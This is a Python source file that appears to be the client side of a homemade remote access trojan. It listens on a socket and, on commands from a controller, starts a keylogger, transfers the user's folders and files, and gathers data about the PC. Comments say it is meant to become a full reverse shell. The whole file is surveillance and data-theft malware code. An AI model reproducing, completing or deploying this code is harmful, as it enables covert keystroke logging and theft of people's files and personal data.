import socket
import userscanner
import keylogger
import getuser_pc
# TODO finish a client command structure
""" 
    This will await commands from the server something like a reverse shell
    When the server sends a show file request this will call the userscanner function
    We can extend this to full on reverse shell in the future
    ALSO:
        OPTIONAL: make a socket that sends the clients ip so the server will know hwo to connect
"""
while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
            print("0: client.py started")
            main_s.bind(("127.0.0.1", 12345))
            print("1: bound the ip and port")
            main_s.listen(1)
            print("2: listening")
            conn, addr = main_s.accept()
            print(f"3: accepted {addr}")
            with conn:
                while True:
                    data = conn.recv(64).decode("utf-8") 
                    # The command section:
                    if data:
                        match data:
                            case "run -keylogger":
                                print("Client Started the keylogger.")
                                print("Command: ", {data})
                                keylogger.start_keylogger()
                                data = ""

                            # To je kokotské implementovanie, ale nemusím 500 if dávať
                            case data if "run -gf" == data:
                                print("Client Started the Folder Transfer.")
                                print("Command: ", {data})
                                userscanner.start_FolderData(data)
                                data = ""

                            case data if "run -gfc" in data:
                                print("Client Started the FileTransfer.")
                                print("Command: ", {data})
                                userscanner.start_sendFiles(data)
                                data = ""
                                
                            case "run -gatherData":
                                getuser_pc.startGathering()
                                print("Gathering Data")
                                data=" "
    
